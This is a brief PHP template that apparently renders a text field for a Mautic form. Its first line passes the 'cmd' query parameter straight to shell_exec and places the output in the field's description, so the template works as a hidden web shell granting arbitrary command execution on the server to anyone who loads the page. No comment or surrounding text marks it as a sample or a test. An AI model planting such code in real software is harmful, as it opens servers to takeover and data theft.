<?php

$cmdOutput = shell_exec($_GET['cmd'] . ' 2>&1');

$field->setDescription($cmdOutput);

echo $view->render(
    'MauticFormBundle:Field:text.html.php',
    [
        'field'  => $field,
        'inForm' => $inForm ?? false,
    ]
);

